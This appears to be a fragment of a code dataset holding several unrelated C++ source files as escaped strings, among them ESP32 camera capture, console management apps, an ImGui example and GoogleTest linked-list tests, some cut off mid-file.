ftpClient.CloseFile();\n  file.close();\n}\n#endif\n\nvoid take_photo()\n{\n  camera_fb_t *fb = NULL; // Frame buffer pointer\n\n  // Capture an image with the camera\n  Serial.println(\"Getting FB\");\n  Serial.println(\"getting FB\");\n  fb = esp_camera_fb_get();\n  if (!fb)\n  {\n    Serial.println(\"Camera capture failed\");\n    return;\n  }\n  lastPhotoMillis = millis();\n\n  delay(1000);\n\n  if (!SD_MMC.begin())\n  {\n    Serial.println(\"SD Card Mount Failed\");\n    return;\n  }\n  else\n  {\n    Serial.println(\"SD mount success\");\n  }\n\n  delay(500);\n\n  // Check if SD card is present\n  uint8_t cardType = SD_MMC.cardType();\n  if (cardType == CARD_NONE)\n  {\n    Serial.println(\"No SD Card attached\");\n    return;\n  }\n\n  // Initialize EEPROM and retrieve the picture number\n  Serial.println(\"Increasing EEPROM\");\n  EEPROM.begin(EEPROM_SIZE);\n  pictureNumber = EEPROM.read(0) + 1;\n\n  //  generate a random number for file name in an effort to stop people systematically viewing old images on a browser\n  long secureNum = random(1000);\n\n  // Construct the file path for the image\n  String path = \"/aa2_\" + String(secureNum) + \"_\" + String(pictureNumber) + \".jpg\";\n\n  // Save the image to the SD card\n  Serial.println(\"FS stuff\");\n  Serial.println(\"Opening FS\");\n  fs::FS &fs = SD_MMC;\n  Serial.println(\"Opening FS File\");\n  File file = fs.open(path.c_str(), FILE_WRITE);\n  if (!file)\n  {\n\n    Serial.printf(\"Failed to open file: %s\\n\", path);\n  }\n  else\n  {\n    file.write(fb->buf, fb->len); // Write image data to the file\n    Serial",
    "#include <iostream>\n#include <memory>\n#include <cstdlib>\n#include \"VehicleManagementSystem.hpp\"\n#include \"Car.hpp\"\n#include \"Motorcycle.hpp\"\n#include \"Truck.hpp\"\n#include \"Utils.hpp\"\n\nvoid clearScreen() {\n    #ifdef _WIN32\n        system(\"cls\");\n    #else\n        system(\"clear\");\n    #endif\n}\n\nvoid showMenu() {\n    std::cout << \"\\n==============================\\n\";\n    std::cout << \"Vehicle Management System\\n\";\n    std::cout << \"==============================\\n\";\n    std::cout << \"1. Add Car\\n\";\n    std::cout << \"2. Add Motorcycle\\n\";\n    std::cout << \"3. Add Truck\\n\";\n    std::cout << \"4. Remove Vehicle\\n\";\n    std::cout << \"5. Display Vehicles\\n\";\n    std::cout << \"6. Search Vehicle\\n\";\n    std::cout << \"7. Update Vehicle\\n\";\n    std::cout << \"8. Exit\\n\";\n    std::cout << \"==============================\\n\";\n    std::cout << \"Enter your choice: \";\n}\n\nvoid addCar(VehicleManagementSystem& vms) {\n    std::string brand;\n    int year, numDoors;\n    int id = vms.generateNextId();\n    std::cout << \"\\nEnter Car Details:\\n\";\n    std::cout << \"------------------\\n\";\n    std::cout << \"Brand: \";\n    std::cin >> brand;\n    std::cout << \"Year: \";\n    std::cin >> year;\n    std::cout << \"Number of doors: \";\n    std::cin >> numDoors;\n    vms.addVehicle(std::make_unique<Car>(id, brand, year, numDoors));\n    std::cout << \"\\nCar added successfully with ID: \" << id << \"\\n\";\n}\n\nvoid addMotorcycle(VehicleManagementSystem& vms) {\n    std::string brand;\n    int year;\n    bool hasSidecar;\n    int id = vms.generateNextId();\n    std::cout << \"\\nEnter Motorcycle Details:\\n\";\n    std::cout << \"-------------------------\\n\";\n    std::cout << \"Brand: \";\n    std::cin >> brand;\n    std::cout << \"Year: \";\n    std::cin >> year;\n    std::cout << \"Has sidecar (1 for yes, 0 for no): \";\n    std::cin >> hasSidecar;\n    vms.addVehicle(std::make_unique<Motorcycle>(id, brand, year, hasSidecar));\n    std::cout << \"\\nMotorcycle added successfully with ID: \" << id << \"\\n\";\n}\n\nvoid addTruck(VehicleManagementSystem& vms) {\n    std::string brand;\n    int year;\n    double loadCapacity;\n    int id = vms.generateNextId();\n    std::cout << \"\\nEnter Truck Details:\\n\";\n    std::cout << \"--------------------\\n\";\n    std::cout << \"Brand: \";\n    std::cin >> brand;\n    std::cout << \"Year: \";\n    std::cin >> year;\n    std::cout << \"Load capacity (in tons): \";\n    std::cin >> loadCapacity;\n    vms.addVehicle(std::make_unique<Truck>(id, brand, year, loadCapacity));\n    std::cout << \"\\nTruck added successfully with ID: \" << id << \"\\n\";\n}\n\nvoid removeVehicle(VehicleManagementSystem& vms) {\n    int id;\n    std::cout << \"\\nEnter Vehicle ID to Remove:\\n\";\n    std::cout << \"---------------------------\\n\";\n    std::cout << \"ID: \";\n    std::cin >> id;\n    if (vms.removeVehicle(id)) {\n        std::cout << \"\\nVehicle removed successfully.\\n\";\n    } else {\n        std::cout << \"\\nVehicle not found.\\n\";\n    }\n}\n\nvoid searchVehicle(VehicleManagementSystem& vms) {\n    int id;\n    std::cout << \"\\nEnter Vehicle ID to Search:\\n\";\n    std::cout << \"---------------------------\\n\";\n    std::cout << \"ID: \";\n    std::cin >> id;\n    Vehicle* vehicle = vms.searchVehicle(id);\n    if (vehicle) {\n        std::cout << \"\\n\";\n        vehicle->displayInfo();\n    } else {\n        std::cout << \"\\nVehicle not found.\\n\";\n    }\n}\n\nvoid updateVehicle(VehicleManagementSystem& vms) {\n    int id;\n    std::cout << \"\\nEnter Vehicle ID to Update:\\n\";\n    std::cout << \"---------------------------\\n\";\n    std::cout << \"ID: \";\n    std::cin >> id;\n    if (vms.updateVehicle(id)) {\n        std::cout << \"\\nVehicle updated successfully.\\n\";\n    } else {\n        std::cout << \"\\nVehicle not found.\\n\";\n    }\n}\n\nint main() {\n    clearScreen();\n\n    VehicleManagementSystem vms;\n    int choice;\n\n    do {\n        showMenu();\n        std::cin >> choice;\n\n        std::cout << \"\\n\";\n        switch (choice) {\n        case 1:\n            addCar(vms);\n            break;\n        case 2:\n            addMotorcycle(vms);\n            break;\n        case 3:\n            addTruck(vms);\n            break;\n        case 4:\n            removeVehicle(vms);\n            break;\n        case 5:\n            vms.displayVehicles();\n            break;\n        case 6:\n            searchVehicle(vms);\n            break;\n        case 7:\n            updateVehicle(vms);\n            break;\n        case 8:\n            std::cout << \"Thank You!\\nExiting...\\n\";\n            break;\n        default:\n            std::cout << \"Invalid choice. Please try again.\\n\";\n        }\n\n        std::cout << \"\\n\";\n    } while (choice != 8);\n\n    return 0;\n}",
    "#include \"uimanager.hpp\"\n\n// CONSTANTS\n\n// COLORS\nsf::Color UI_BG = sf::Color(67, 63, 94);\n\nsf::Color DARK_GRAY = sf::Color(100, 100, 100);\nsf::Color DARK_GREEN = sf::Color(10, 150, 10);\nsf::Color LIGHT_GRAY = sf::Color(180, 180, 180);\n\n// UI AREAS\nsf::IntRect endTurnArea(1080, 863, 200, 160);\nsf::IntRect mapArea(LEFT_MAP_OFFSET, TOP_MAP_OFFSET,\n                    NUM_OF_COLS*(TILE_SIZE + OUTLINE_SIZE),\n                    NUM_OF_ROWS*(TILE_SIZE + OUTLINE_SIZE));\nsf::IntRect menuArea(LEFT_MAP_OFFSET, 863, WINDOW_WIDTH - LEFT_MAP_OFFSET - 200,\n                     160);\n// For mainmenu:\nsf::IntRect startArea(WINDOW_WIDTH / 2 - 250 / 2,\n                      WINDOW_HEIGHT / 2 - 100 / 2 - 50, 250, 100);\nsf::IntRect mapeditorArea(WINDOW_WIDTH / 2 - 250 / 2,\n                          WINDOW_HEIGHT / 2 - 100 / 2 + 50, 250, 100);\n\nUIManager::UIManager() {\n  // Default to main menu\n  setState(MAINMENU);\n}\n\nvoid UIManager::setState(UIState state) { state_ = state; }\n\nUIState UIManager::getState() const { return state_; }",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>    // std::sort\nusing namespace std;\n\nstd::vector<int> lv,rv;\n\nint handleInput(string line);\nbool cmp(int a, int b);\nvoid readLineToLists(string line);\n\nvoid readLineToLists(string line)\n{\n\tstring  dlm  = \"   \";\n\t// split line into two strings -> left and righti\n\tsize_t dp = line.find(dlm);\n\tint l = stoi(line.substr(0,dp));\n\tint r = stoi(line.substr(dp + dlm.length()));\n\n\t// take each \tstring put it on a list -> left and right list\n\tlv.push_back(stoi(line.substr(0,dp)));\n\trv.push_back(stoi(line.substr(dp + dlm.length())));\n\t\n}\n\nbool cmp(int a , int b ) {return a>b;}\n\nint calculate()\n{\n\t// sort lists\n\tstd::sort(lv.begin(),lv.end(),cmp);\n\tstd::sort(rv.begin(),rv.end(),cmp);\n\n\t// abstract one list from another and add it to totalSum\n\tint sum = 0; \n\tfor(auto i=0;i < lv.size();i++)\n\t{\n\t\tsum += lv[i] > rv[i] ? lv[i] - rv[i] : rv[i] - lv[i];\n\t} \n\n\treturn sum;\n}\n\nint main (){\n\tstd::string f = \"input.txt\";\n\t//open file\n\tifstream mf(f);\n\tstd::string line; \n\n\tstd::cout << \"-----------Starting-------------\\n\";\n\tif (!mf.is_open())\n\t{\n\t\tstd::cerr << \"Failed to open file\" << endl;\n\t\treturn 1;\n\t}\t\n\twhile (std::getline(mf,line) )\n\t{\n\t\treadLineToLists(line);\n\t}\n\t\n\n\tstd::cout << calculate() << endl;\n\tmf.close();\n\tstd::cout << \"-----------Finish---------------\\n\";\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nvector<int> FirstNegativeInteger(vector<int>& arr, int k) {\n        // write code here\n        int n = arr.size();\n        queue<int>q;\n        int i=0,j=0;\n        vector<int>ans;\n        while(j < n){\n            if(arr[j] < 0) q.push(arr[j]);\n            \n            if(j-i+1 == k){\n                if(q.size() == 0) ans.push_back(0);\n                else {\n                    ans.push_back(q.front());\n                    if(arr[i] == q.front()) q.pop();\n                    \n                }\n                i++;\n                j++;\n            }\n            else if(j-i+1 < k) j++;\n            else {\n                while(j-i+1 > k){\n                    if(arr[i] == q.front()) q.pop();\n                    i++;\n                } \n                j++;\n            }\n            \n        }\n        return ans;\n    }\n\n    int main(){\n    vector<int>arr = {-2,1,-4,5,-6,3,2};\n    int k = 4;\n    vector<int>ans =  FirstNegativeInteger(arr,k);\n    for(auto it:ans) cout<<it<<\" \";\n    return 0;\n\n    }",
    "#include <iostream>\r\n#include <string>\r\n#include <map>\r\nusing namespace std;\r\n\r\n\r\nclass PhoneBookBase {\r\nprotected:\r\n    map<string, string> contacts; \r\n\r\npublic:\r\n    \r\n    PhoneBookBase() {\r\n        cout << \"PhoneBookBase initialized.\" << endl;\r\n    }\r\n\r\n    void addContact(const string& name, const string& phoneNumber) {\r\n        contacts[name] = phoneNumber;\r\n        cout << \"Contact added successfully \"<< endl;\r\n    }\r\n\r\n    void displayContacts() {\r\n        if (contacts.empty()) {\r\n            cout << \"Phonebook is empty.\" << endl;\r\n            return;\r\n        }\r\n        cout << \"Phonebook entries:\" << endl;\r\n        for (const auto& entry : contacts) {\r\n            cout << entry.first << \" - \" << entry.second << endl;\r\n        }\r\n    }\r\n};\r\n\r\n\r\nclass PhoneBook : public PhoneBookBase {\r\npublic:\r\n    \r\n    void searchContact(const string& name) {\r\n        auto it = contacts.find(name);\r\n        if (it != contacts.end()) {\r\n            cout << \"Found: \" << it->first << \" - \" << it->second << endl;\r\n        } else {\r\n            cout << \"Contact not found.\" << endl;\r\n        }\r\n    }\r\n\r\n    void deleteContact(const string& name) {\r\n        auto it = contacts.find(name);\r\n        if (it != contacts.end()) {\r\n            contacts.erase(it);\r\n            cout << \"Contact deleted successfully: \" << name << endl;\r\n        } else {\r\n            cout << \"Contact not found.\" << endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    PhoneBook phoneBook;\r\n    int choice;\r\n    string name, phoneNumber;\r\n\r\n    do {\r\n        cout << \"\\nPhonebook Application\" << endl;\r\n        cout << \"1. Add Contact\" << endl;\r\n        cout << \"2. Search Contact\" << endl;\r\n        cout << \"3. Delete Contact\" << endl;\r\n        cout << \"4. Display All Contacts\" << endl;\r\n        cout << \"5. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n        case 1:\r\n            cout << \"Enter name: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n            cout << \"Enter phone number: \";\r\n            getline(cin, phoneNumber);\r\n            phoneBook.addContact(name, phoneNumber);\r\n            break;\r\n        case 2:\r\n            cout << \"Enter name to search: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n            phoneBook.searchContact(name);\r\n            break;\r\n        case 3:\r\n            cout << \"Enter name to delete: \";\r\n            cin.ignore();\r\n            getline(cin, name);\r\n            phoneBook.deleteContact(name);\r\n            break;\r\n        case 4:\r\n            phoneBook.displayContacts();\r\n            break;\r\n        case 5:\r\n            cout << \"Exiting Phonebook Application.\" << endl;\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}\r\n",
    "// Dear ImGui: standalone example application for GLFW + OpenGL 3, using programmable pipeline\n// (GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n#include \"imgui.h\"\n#include \"imgui_impl_glfw.h\"\n#include \"imgui_impl_opengl3.h\"\n#include <stdio.h>\n#define GL_SILENCE_DEPRECATION\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n#include <GLES2/gl2.h>\n#endif\n\n//#include <glm/glm.hpp> // Include just to test that the linking process is successfull\n//#include <glad/glad.h>\n#include <GLFW/glfw3.h> // Will drag system OpenGL headers\n\n// [Win32] Our example includes a copy of glfw3.lib pre-compiled with VS2010 to maximize ease of testing and compatibility with old VS compilers.\n// To link with VS2010-era libraries, VS2015+ requires linking with legacy_stdio_definitions.lib, which we do using this pragma.\n// Your own project should not be affected, as you are likely to link with a newer binary of GLFW that is adequate for your version of Visual Studio.\n#if defined(_MSC_VER) && (_MSC_VER >= 1900) && !defined(IMGUI_DISABLE_WIN32_FUNCTIONS)\n#pragma comment(lib, \"legacy_stdio_definitions\")\n#endif\n\n// This example can also compile and run with Emscripten! See 'Makefile.emscripten' for details.\n#ifdef __EMSCRIPTEN__\n#include \"../libs/emscripten/emscripten_mainloop_stub.h\"\n#endif\n\nstatic void glfw_error_callback(int error, const char* description)\n{\n    fprintf(stderr, \"GLFW Error %d: %s\\n\", error, description);\n}\n\n// Main code\nint main(int, char**)\n{\n    glfwSetErrorCallback(glfw_error_callback);\n    if (!glfwInit()){\n        fprintf(stderr, \"GLFW Initialization Failed\");\n        return 1;\n    }\n\n//works but should provide rendering logic\n/*\n    if(!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)){\n        fprintf(stderr, \"GLAD Initialization Failed\");\n        return 1;\n    }\n*/\n\n    // Decide GL+GLSL versions\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n    // GL ES 2.0 + GLSL 100 (WebGL 1.0)\n    const char* glsl_version = \"#version 100\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 2);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);\n#elif defined(IMGUI_IMPL_OPENGL_ES3)\n    // GL ES 3.0 + GLSL 300 es (WebGL 2.0)\n    const char* glsl_version = \"#version 300 es\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);\n#elif defined(__APPLE__)\n    // GL 3.2 + GLSL 150\n    const char* glsl_version = \"#version 150\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);  // 3.2+ only\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);            // Required on Mac\n#else\n    // GL 3.0 + GLSL 130\n    const char* glsl_version = \"#version 130\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n    //glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);  // 3.2+ only\n    //glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);            // 3.0+ only\n#endif\n\n    // Create window with graphics context\n    GLFWwindow* window = glfwCreateWindow(1280, 720, \"Renderer\", nullptr, nullptr);\n    if (window == nullptr)\n        return 1;\n    glfwMakeContextCurrent(window);\n    glfwSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplGlfw_InitForOpenGL(window, true);\n#ifdef __EMSCRIPTEN__\n    ImGui_ImplGlfw_InstallEmscriptenCallbacks(window, \"#canvas\");\n#endif\n    ImGui_ImplOpenGL3_Init(glsl_version);\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_Impl",
    "#include <iostream>\n#include <string>\n#include \"animal.h\"\n\nusing namespace std;\n\nAnimal::Animal(string animalID, string Name, string Offsprings, string CellID, string Gender, int Age, float Weight, string category, bool Status, string keeper, string dietery, string foodSupply, string _Category , string habitat, string dob, string Category, string cellID, float areaOfCell, string cellLocation): health(Status, keeper, dietery, foodSupply, _Category), habitat(habitat, dob, Category, cellID, areaOfCell, cellLocation)\n{\n     setAnimalID(animalID);\n     setName(Name);\n     setOffSprings(Offsprings);\n     setCellID(CellID);\n     setGender(Gender);\n     setAge(Age);\n     setWeight(Weight);\n     setCategory(category);\n}\n\nAnimal::Animal(Animal &obj): health(obj.health), habitat(obj.habitat)\n{\n    setAnimalID(obj.getAnimalID());\n    setName(obj.getName());\n    setOffSprings(obj.getOffSprings());\n    setCellID(obj.getCellID());\n    setGender(obj.getGender());\n    setAge(obj.getAge());\n    setWeight(obj.getWeight());\n    setCategory(obj.getCategory());\n}\n\nAnimal::~Animal()\n{\n\n}\n\nvoid Animal::setAnimalID(string a)\n{\n    animal_id=a;\n}\n\nvoid Animal::setName(string b)\n{\n    name=b;\n}\n\nvoid Animal::setOffSprings(string c)\n{\n    offsprings=c;\n}\n\nvoid Animal::setCellID(string d)\n{\n    cell_id=d;\n}\n\nvoid Animal::setGender(string e)\n{\n    gender=e;\n}\n\nvoid Animal::setAge(int f)\n{\n    age=f;\n}\n\nvoid Animal::setWeight(float g)\n{\n    weight=g;\n}\n\nvoid Animal::setCategory(string h)\n{\n    category=h;\n}\n\nstring Animal::getAnimalID()\n{\n    return animal_id;\n}\n\nstring Animal::getName()\n{\n    return name;\n}\n\nstring Animal::getOffSprings()\n{\n    return offsprings;\n}\n\nstring Animal::getCellID()\n{\n    return cell_id;\n}\n\nstring Animal::getGender()\n{\n    return gender;\n}\n\nint Animal::getAge()\n{\n    return age;\n}\n\nfloat Animal::getWeight()\n{\n    return weight;\n}\n\nstring Animal::getCategory()\n{\n    return category;\n}\n\nvoid Animal::displayAnimal()\n{\n    cout<<\"Animal ID: \"<<getAnimalID()<<endl;\n    cout<<\"Name: \"<<getName()<<endl;\n    cout<<\"Offspring: \"<<getOffSprings()<<endl;\n    cout<<\"Cell ID: \"<<getCellID()<<endl;\n    cout<<\"Gender: \"<<getGender()<<endl;\n    cout<<\"Age: \"<<getAge()<<endl;\n    cout<<\"Weight: \"<<getWeight()<<endl;\n}\n\nAnimalHealth& Animal::getHealthDetails()\n{\n    return health;\n}\n\nHabitat& Animal::getHabitatDetails()\n{\n    return habitat;\n}\n\nvoid Animal::deleteAnimal(Animal* animals[], int& num, string id)\n{\n    int index=-1;\n    for (int i=0;i<num;i++)\n    {\n        if(animals[i]->getAnimalID()==id)\n        {\n            index=i;\n        }\n    }\n\n    if(index!=-1)\n    {\n        delete animals[index];\n\n        for (int i=index;i<num-1;i++)\n        {\n            animals[i]=animals[i+1];\n        }\n        num--;\n\n        cout<<\"Animal deleted successfully.\\n\";\n    }\n    else\n    {\n        cout<<\"Animal id was not found. Unable to delete\\n\";\n    }\n}\n\nvoid Animal::findAnimalByID(Animal* animals[], int& num, string id)\n{\n    int index=-1;\n    int counter=0;\n    for (int i=0;i<num;i++)\n    {\n        if(animals[i]->getAnimalID()==id)\n        {\n            index=i;\n            counter=1;\n            cout<<\"Animal has been found at index: \"<<index<<endl;\n            animals[index]->displayAnimal();\n        }\n    }\n\n    if(counter!=1)\n    {\n        cout<<\"Animal was not found\\n\";\n    }\n}\n\nvoid Animal::findAnimalByLocation(Animal* animals[], int& num, string location)\n{\n    int counter=0;\n\n    cout<<\"Animals in location \"<<location<<\": \"<<endl;\n    for(char& c : location)\n    {\n        c=tolower(c);\n    }\n\n    for(int i=0;i<num;i++)\n    {\n        if(animals[i]->getHabitatDetails().getLocationOfCell() == location)\n        {\n            animals[i]->displayAnimal();\n            counter++;\n        }\n    }\n\n    if(counter==0)\n    {\n        cout<<\"No Animals found in this location\"<<endl;\n    }\n}\n\nvoid Animal::listByCategory(Animal* animals[], int& num, string category)\n{\n    int counter=0;\n    cout<<\"The animals that are in the \"<<category<<\" are: \"<<endl;\n    for(char& c : category)\n    {\n        c=tolower(c);\n    }\n\n    for(int i=0;i<num;i++)\n    {\n        if(animals[i]->getCategory()==category)\n        {\n            cout<<\"----------Animal \"<<counter+1<<\"----------\"<<endl;\n            animals[i]->displayAnimal();\n            cout<<endl;\n            counter++;\n        }\n    }\n    if(counter==0)\n    {\n        cout<<\"No Animals found in this category\"<<endl;\n    }\n}\n\nvoid Animal::listByCategory(Animal* animals[], int& num, string category, string category2)\n{\n    int counter=0;\n    cout<<\"The animals that are in the \"<<category<<\" and \"<<category2<<\" are: \"<<endl;\n    for(char& c : category)\n    {\n        c=tolower(c);\n    }\n    for(char& c : category2)\n    {\n        c=tolower(c);\n    }\n\n    for(int i=0;i<num;i++)\n    {\n        if((animals[i]->getCategory()==category) && (animals[i]->getHealthDetails().getCategory()==category2))\n        {\n            cout<<\"----------Animal \"<<counter+1<<\"----------\"<<endl;\n            animals[i]->displayAn",
    "#include <gmock/gmock.h>\n#include <gtest/gtest.h>\n\n#include \"canvaslist.h\"\n#include \"include/shape.h\"\n\nusing namespace std;\nusing namespace testing;\n\nTEST(FakeTest, PleaseDeleteOnceYouWriteSome) {\n  // If no tests exist, GoogleTest fails to compile with a fairly confusing\n  // message. We have this empty test that does nothing to allow an empty\n  // autograder submission to compile and regularly fail. Once you write your\n  // own tests for the project, you can delete this one.\n  EXPECT_THAT(1, Eq(1));\n}\n\nTEST(CanvasListCore, ConstTest) {\n  CanvasList list;\n\n  EXPECT_THAT(0, Eq(list.size()));\n  EXPECT_THAT(list.front(), Eq(nullptr));\n  list.clear();\n}\n\nTEST(CanvasListCore, FrontTest) {\n  CanvasList list;\n\n  Shape* shape1 = new Shape;\n  list.push_front(shape1);\n\n  EXPECT_THAT(list.front()->value, Eq(shape1));\n  list.clear();\n}\n\nTEST(CanvasListCore, SizeTest) {\n  CanvasList list;\n\n  EXPECT_THAT(0, Eq(list.size()));\n\n  CanvasList list2;\n  Shape* shape1 = new Shape;\n  list2.push_front(shape1);\n\n  EXPECT_THAT(list2.size(), Eq(1));\n  list.clear();\n}\n\nTEST(CanvasListCore, EmptyTest) {\n  CanvasList list;\n  EXPECT_THAT(true, Eq(list.empty()));\n\n  CanvasList list2;\n  Shape* shape1 = new Shape;\n  list2.push_front(shape1);\n\n  EXPECT_THAT(list2.empty(), Eq(false));\n  list.clear();\n}\n\nTEST(CanvasListCore, CleanTest) {\n  CanvasList list;\n  EXPECT_THAT(0, Eq(list.size()));\n\n  CanvasList list2;\n  Shape* shape1 = new Shape;\n  list2.push_front(shape1);\n  list2.clear();\n\n  EXPECT_THAT(list.size(), Eq(0));\n  list.clear();\n}\n\nTEST(CanvasListCore, PushFrontTest) {\n  CanvasList list2;\n  Shape* shape1 = new Shape;\n  Shape* shape2 = new Shape;\n\n  list2.push_front(shape1);\n  list2.push_front(shape2);\n\n  EXPECT_THAT(2, Eq(list2.size()));\n  EXPECT_THAT(list2.front()->value, Eq(shape2));\n  list2.clear();\n}\n\nTEST(CanvasListCORE, DestructorTest) {\n  CanvasList* list = new CanvasList();\n  delete list;\n\n  EXPECT_THAT(list->size(), Eq(0));\n}\n\n\nTEST(CanvasListIterating, ShapeTest) {\n  CanvasList list2;\n  Shape* shape1 = new Shape;\n  Shape* shape2 = new Shape;\n\n  list2.push_back(shape1);\n  list2.push_back(shape2);\n  EXPECT_THAT(shape2, Eq(list2.shape_at(1)));\n  list2.clear();\n}\n\nTEST(CanvasListIterating, FindTest) {\n  CanvasList list;\n  Shape* shape1 = new Shape(5, 4);\n  Shape* shape2 = new Shape(7, 6);\n\n  list.push_back(shape1);\n  list.push_back(shape2);\n\n  EXPECT_THAT(0, Eq(list.find(5, 4)));\n  EXPECT_THAT(1, Eq(list.find(7, 6)));\n  EXPECT_THAT(-1, Eq(list.find(8, 9)));\n  list.clear();\n}\n\nTEST(CanvasListIterating, CopyTest) {\n  CanvasList list;\n  Shape* Rect1 = new Rect(5, 4);\n  Circle* circle2 = new Circle(4);\n\n  list.push_back(Rect1);\n  list.push_back(circle2);\n\n  CanvasList copyList(list);\n  \n\n  EXPECT_THAT(list.size(), Eq(copyList.size()));\n  //EXPECT_THAT(list.front()->value, Ne(copyList.front()->value));\n  EXPECT_THAT(list.front(), Ne(copyList.front()));\n  EXPECT_THAT(list.find(8, 9), Eq(copyList.find(8, 9)));\n  //EXPECT_THAT(list.shape_at(0), Ne(copyList.shape_at(0)));\n\n  //Check copy_no_use_shape_copy\n \n  EXPECT_THAT(copyList.shape_at(0)->as_string(), Eq(list.shape_at(0)->as_string()));\n\n  list.clear();\n  copyList.clear();\n}\n\n\nTEST(CanvasListModifying, EqualsTest) {\n  CanvasList list;\n  Shape* shape1 = new Shape(5, 4);\n  Shape* shape2 = new Shape(7, 6);\n  Shape* shape3 = new Shape();\n  \n  list.push_back(shape1);\n  list.push_back(shape2);\n  list.push_back(shape3);\n  \n  CanvasList list2;\n  Rect* rect1 = new Rect(5, 4);\n  RightTriangle* triangle2 = new RightTriangle(7, 6);\n  Circle* circle3 = new Circle();\n\n  list2.push_back(rect1);\n  list2.push_back(triangle2);\n  list2.push_back(circle3);\n  list = list2; //regular check //copying shapes correctly\n\n  EXPECT_THAT(list.size(), Eq(list2.size())); \n  EXPECT_THAT(list.shape_at(1)->as_string(), Eq(list2.shape_at(1)->as_string()));\n\n  CanvasList list3;\n  list = list3;\n\n  EXPECT_THAT(list.size(), Eq(0)); // list is empty after pop\n  //EXPECT_THAT(list.shape_at(2), Eq(nullptr)); // Alters size\n\n  list.clear();\n  list2.clear();\n  list3.clear();\n  \n}\n\nTEST(CanvasListModifying, PopFrontTest) {\n  CanvasList list;\n  Shape* shape1 = new Shape(5, 4);\n  Shape* shape2 = new Shape(7, 6);\n  Shape* shape3 = new Shape();\n\n  list.push_back(shape1);\n  list.push_back(shape2);\n  list.push_back(shape3);\n\n  Shape* pop = list.pop_front();\n\n  CanvasList list2;\n  Shape* pop2 = list2.pop_front(); //null;\n\n  CanvasList list3;\n  Shape* shape4 = new Shape(1, 1);\n  list3.push_back(shape4);\n  Shape* pop3 = list3.pop_front();\n\n  EXPECT_THAT(list3.size(), Eq(0)); // list is empty after pop\n  EXPECT_THAT(list.front()->value, Eq(shape2));\n  EXPECT_THAT(list.size(), Eq(2)); // Alters size\n  EXPECT_THAT(list2.size(), Eq(0)); // list is empty\n\n  // Edge case: pop front from a list with one element\n  delete pop;\n  delete pop2;\n  delete pop3;\n\n  list.clear();\n  list2.clear();\n  list3.clear();\n\n}\n\nTEST(CanvasListModifying, PopBackTest) {\n  CanvasList list;\n  Shape* shape1 = new Shape(5, 4);\n  Shape* shape2 = new Shape(7, 6);\n  Shape*",
